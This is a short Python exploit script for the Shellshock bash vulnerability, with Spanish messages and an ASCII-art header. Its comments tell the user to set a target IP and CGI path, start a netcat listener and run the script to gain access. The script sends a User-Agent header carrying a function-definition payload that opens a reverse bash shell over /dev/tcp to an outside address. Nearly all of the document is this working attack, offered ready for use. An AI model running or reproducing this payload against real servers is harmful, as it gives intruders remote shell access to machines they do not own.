# 1 modify the script adding the ip number and path
# 2 listen from the port for example: nc -nlvp 9001
# 3 execute the code with python 3 and obtain access
#
#⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣤⣤⣄⠀⠀⠀
#⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣶⠟⣫⡿⠉⢻⣇⠀⠀
#⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣾⠟⢁⡴⠋⠀⠀⠈⢿⡆⠀
#⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣾⣿⣿⠷⣶⣤⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣴⡿⠋⠁⣠⠞⠁⠀⠀⠀⠀⢸⣷⠀
#⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⡏⠀⠉⠳⢤⡉⠙⠻⣷⣦⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣾⠏⠁⠀⣰⠃⠀⠀⠀⠀⠀⠀⠈⣿⡆
#⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⡇⠀⠀⠀⠀⠙⠶⣄⠀⠉⠻⢷⣦⣀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣀⣀⣀⣀⣀⣀⣀⣠⣾⠟⠁⠀⢀⡾⠁⠀⠀⠀⠀⠀⠀⠀⠀⢹⡇
#⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⡇⠀⠀⠀⠀⠀⠀⠈⠳⣄⠀⠀⠉⠛⢿⣶⣀⣤⣶⠶⠿⠟⠛⣿⠉⠉⠉⠉⠉⠙⠛⠳⠶⠦⣤⣞⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡇
#⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⡇⠀⠀⠀⠀⠀⠀⠀⠀⠈⠳⣄⠀⣀⡴⠿⠉⠉⠀⠀⠀⠀⠀⣿⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠙⠲⢤⣀⠀⠀⠀⠀⠀⠀⢸⡇
#⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣧⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⡾⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⣟⣧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠳⣄⠀⠀⠀⢀⣿⠇
#⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⣿⡴⠀⠀⠀⠀⠀⠀⣠⡾⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡇⠘⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠳⡄⠀⢸⡟⠀
#⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⣷⠀⠀⠀⠀⢀⡼⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⠀⠀⠹⣆⠀⠀⠀⠀⠀⣠⡴⠶⠖⠶⠶⢦⣀⠀⠀⠀⠹⣦⡿⠁⠀
#⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢿⣧⠀⠀⢠⡟⠀⠀⠀⠀⢀⣀⣠⠤⢤⣀⣀⠀⠀⠀⢀⡟⠀⠀⠀⠙⣦⠀⠀⣴⣟⣁⣀⣀⡀⠀⠀⠀⠈⠳⣆⠀⠀⠸⣷⡀⠀
#⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢻⣧⣄⡿⠀⠀⠀⣠⠶⠋⠁⠀⠀⢀⣀⣉⡳⢦⣀⣾⠀⠀⠀⠀⠀⠘⢷⡾⡿⠚⠻⣿⣿⣿⣶⡄⠀⠀⠀⠸⡆⠀⠀⢹⣇⠀
#⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢙⣿⠁⠀⠀⣴⠋⠀⠀⠀⣠⣾⣿⣿⠋⠉⠳⣝⢧⡀⠀⠀⠀⠀⠀⡾⢻⣧⣀⣀⣿⣿⣿⣿⣿⡄⠀⠀⠀⡇⠀⠀⠸⣿⡄
#⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡿⠀⠀⢰⠇⠀⠀⠀⢰⣿⣿⣿⣿⣄⣀⣴⣿⠈⢷⠀⠀⠀⠀⣸⡃⠸⣿⣿⢿⣿⣿⠟⠉⣿⠁⠀⠀⢠⡇⠀⠀⠀⣿⡇
#⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣇⠀⠀⠘⣇⠀⠀⠀⢸⣿⠿⢿⣿⣿⠿⠿⣿⠀⠈⡇⠀⠀⠀⠙⣇⠀⠙⢧⣀⣀⣀⣠⠶⠃⠀⠀⣠⠟⠁⠀⠀⠀⣿⡇
#⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⣿⠀⠀⠀⠻⣄⠀⠀⠀⠻⣤⣀⣀⣀⣠⡶⠋⢀⣼⠃⣀⣀⣀⡀⠙⠶⢤⣀⣈⣉⣉⣁⣀⣤⠶⠾⢥⣀⣀⡀⠀⢠⣿⠁
#⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⡆⠀⠀⠀⠉⠳⢤⣀⣀⠀⠉⠉⣉⣁⣠⠶⠚⠁⠀⠈⠙⡏⠁⠀⠀⠀⠈⠉⠉⡉⠉⠁⠀⠀⠀⠁⠀⠉⠉⠙⣻⡏⠀
#⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⣿⠀⠀⠀⢀⣀⠶⠛⠉⠉⠉⠉⠉⢉⡀⠀⠀⠀⠀⠀⣠⢿⣄⠀⠀⠀⠀⢠⡟⠁⠀⠀⠀⠀⠀⡈⠉⠉⠉⢹⡿⠓⠀
#⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠻⣷⠴⠞⠋⠁⣀⡀⠀⠀⠀⠀⠀⠈⠳⣄⣀⣀⣠⠞⠁⠀⠈⠙⠲⠶⠖⠋⠀⠀⠀⠀⠀⠀⠈⠓⠶⢤⣰⣿⣃⡀⠀
#⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣷⡶⠚⠋⠉⢀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠶⢤⣀⣴⡟⠉⠙⠃⠀
#⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⣦⣠⠶⠋⠀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣼⡿⠳⣦⣀⠀⠀⠀
#⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣾⡿⠙⠷⣄⣶⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣠⠶⠛⠉⣿⠀⠀⠀⠉⠀⠀⠀
#⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⡿⠋⠀⢀⡶⠋⠉⢳⠶⠦⣄⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⡤⠴⠶⠒⠉⠉⠀⠀⠀⠀⣿⠀⠀⠀⠀⠀⠀⠀
#⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⡿⠋⠀⠀⠐⠋⠀⠀⢀⡿⠀⠀⠀⠀⠉⠉⠉⠉⠉⠉⠉⠉⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⠀⠀⠀⠀⠀⠀⠀
#⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⡿⠋⠀⠀⠀⠀⠀⠀⠀⠀⣾⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⠀⠀⠀⠀⠀⠀⠀
#⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⡿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⣾⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⠀⠀⠀⠀⠀⠀⠀
#⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣾⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡾⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡟⠀⠀⠀⠀⠀⠀⠀
#⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⣤⠟⠀⠀⢠⡄⠀⠀⠀⠀⠀⠀⠀⠀⠰⠶⠦⢤⣤⠤⠶⠖⠀⠀⠀⠀⠀⠀⠀⠀⢸⡇⠀⠀⠀⠀⠀⠀⠀
#⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣿⡇⠀⠀⠀⠀⠀⠀⠀⢀⣰⠞⠁⠀⠀⠀⠉⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣾⡇⠀⠀⠀⠀⠀⠀⠀
#⠀⠀⠀⠀⠀⠀⠀⣀⣤⣶⠿⡿⠀⠀⠀⠀⠀⣀⡤⠶⠋⠀⠀⠀⠀⠀⠀⠀⣷⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⠃⠀⠀⠀⠀⠀⠀⠀
#⠀⠀⠀⠀⣀⣴⡿⠛⠉⠀⢰⡧⠤⠶⠶⠒⠋⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡟⠀⠀⠀⠀⠀⠀⠀⠀
#⠀⠀⣠⣾⠟⠉⠀⠀⠀⠀⢸⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⣇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣿⠇⠀⠀⠀⠀⠀⠀⠀⠀
#⠀⣰⡿⠃⠀⠀⠀⠀⠀⣀⣘⣇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡏⠀⠀⠀⠀⣀⡀⠀⠀⠀⣸⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀
#⢸⣿⠁⠀⠀⠀⠀⢰⡟⠉⠉⢹⡄⠀⠀⠀⠀⠀⠀⠀⣀⡴⠚⠋⠉⠉⠉⠙⠶⣄⣷⣠⠶⠚⠉⠉⠉⠉⠙⠶⣤⣧⡴⠞⠋⠉⠉⠉⠙⠲⢦⣿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀
#⢸⣿⠀⠀⠀⠀⠀⠸⣇⣀⣀⣀⣻⣄⣀⣀⣀⣀⣀⣰⣏⡀⠀⣴⠀⠀⣤⠀⠀⠈⣿⠁⠀⠀⣶⠀⠀⣤⠀⠀⠈⡿⠀⠀⢰⡀⠀⢠⠀⠀⠀⢻⣇⠀⠀⠀⠀⠀⠀⠀⠀⠀
#⠸⣿⡆⠀⠀⠀⠀⠀⠀⠈⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⢷⣼⠀⠀⣿⠀⠀⠀⣿⡀⠀⠀⢹⠀⠀⣿⠀⠀⠀⣷⠀⠀⢸⡇⠀⢸⠀⠀⠀⣸⡿⠀⠀⠀⠀⠀⠀⠀⠀⠀
#⠀⠸⣿⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⡿⠿⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠟⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀
#⠀⠀⠈⠻⣷⣄⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⡿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
#⠀⠀⠀⠀⠈⠉⠻⠿⠶⠶⠶⠶⠶⠶⠶⠶⠶⠶⠶⠶⠶⠿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
#
#!/usr/bin/python3

from pwn import *
import requests, signal, sys, pdb, threading

def def_handler(sig, frame):
    print("\n\n[!] Saliendo...\n")
    sys.exit(1)

# CTRL_C
signal.signal(signal.SIGINT, def_handler)

main_url = "http://ADDIP/cgi-bin/addPATH"

def shellshock():
    headers = {
        "User-Agent": "() { :; }; echo; /bin/bash -i >& /dev/tcp/192.168.1.43/443 0>&1"
    }
    r = requests.get(main_url, headers=headers)

if __name__ == '__main__':
    shellshock()
